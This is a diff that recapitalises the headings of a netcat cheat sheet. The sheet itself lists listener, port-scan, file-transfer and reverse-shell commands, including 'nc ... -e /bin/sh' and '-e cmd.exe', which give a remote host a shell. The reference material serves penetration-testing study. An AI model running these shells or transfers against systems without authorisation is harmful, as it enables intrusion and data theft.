@@ -1,17 +1,17 @@
-### source
+### Source
 https://github.com/diegocr/netcat  
 
-### start listener
+### Start listener
 ```
 nc -lvp <lport>
 ```
 
-### connect to given port using TCP, -v verbose, -n dont resolve
+### Connect to given port using TCP, -v verbose, -n dont resolve
 ```
 nc -nv <rhost> <rport>
 ```
 
-### port scan, -z zero I/O mode, -w wait
+### Port scan, -z zero I/O mode, -w wait
 ```
 nc -z -n -v -w1 <rhost> <rport>-<rport>
 ```
@@ -26,17 +26,17 @@ nc -nv <lhost> <lport> -e cmd.exe
 nc -nv <lhost> <lport> -e /bin/sh
 ```
 
-### send file (-N close connection after transfer done)
+### Send file (-N close connection after transfer done)
 ```
 nc -N <lhost> <lport> < <file>
 ```
 
-### receive file
+### Receive file
 ```
 nc -vlp <lport> > <file>
 ```
 
-### receive file base64 encoded
+### Receive file base64 encoded
 ```
 nc -lnp <lport> | base64 -i -d > <file>
 ```
